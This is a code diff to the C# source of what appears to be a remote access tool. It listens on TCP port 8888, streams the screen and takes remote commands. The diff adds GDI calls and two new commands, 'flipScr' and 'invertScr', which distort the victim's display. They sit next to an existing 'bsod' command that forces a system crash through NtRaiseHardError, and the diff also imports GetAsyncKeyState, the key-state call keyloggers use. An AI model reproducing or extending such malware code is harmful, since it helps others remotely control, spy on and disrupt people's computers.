@@ -17,6 +17,7 @@ using System.Net.NetworkInformation;
 using System.Management;
 using Newtonsoft.Json;
 using Hardware.Info;
+using System.Windows.Media.TextFormatting;
 
 namespace Server
 {
@@ -31,6 +32,38 @@ namespace Server
 
         [DllImport("ntdll.dll")]
         public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+
+        //gdi
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetDC(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+        [DllImport("gdi32.dll")]
+        private static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
+            IntPtr hdcSource, int xSrc, int ySrc, int wSrc, int hSrc, int dwRop);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr CreateCompatibleDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int height);
+
+        [DllImport("gdi32.dll")]
+        private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);
+
+        [DllImport("gdi32.dll")]
+        private static extern bool DeleteDC(IntPtr hdc);
+
+        [DllImport("gdi32.dll")]
+        private static extern bool DeleteObject(IntPtr hObject);
+
+        [DllImport("user32.dll")]
+        private static extern short GetAsyncKeyState(int vKey);
+
 
 
         static TcpListener screenListener;
@@ -56,10 +89,17 @@ namespace Server
         static string systemInfo;
         static IHardwareInfo hardwareInfo;
 
+
+        private static IntPtr screenDC;
+
+
         static async Task Main(string[] args)
         {
             Console.SetWindowSize(110, 25);
-            
+
+            screenDC = GetDC(IntPtr.Zero); // Get DC for entire screen
+
+
 
             screenListener = new TcpListener(IPAddress.Any, 8888);
             screenListener.Start();
@@ -467,6 +507,20 @@ namespace Server
 
                             case "bsod":
                                 BSOD();
+                                break;
+
+                            case "flipScr":
+                                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
+                                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+
+                                StretchBlt(screenDC, 0, 0, screenWidth, screenHeight,
+                                    screenDC, 0, screenHeight, screenWidth, -screenHeight, 0x00CC0020);
+                                break;
+
+                            case "invertScr":
+                                int x = Screen.PrimaryScreen.Bounds.Width;
+                                int y = Screen.PrimaryScreen.Bounds.Height;
+                                StretchBlt(screenDC, 0, 0, x, y, screenDC, 0, 0, x, y, 0x00330008);
                                 break;
 
                             default: break;
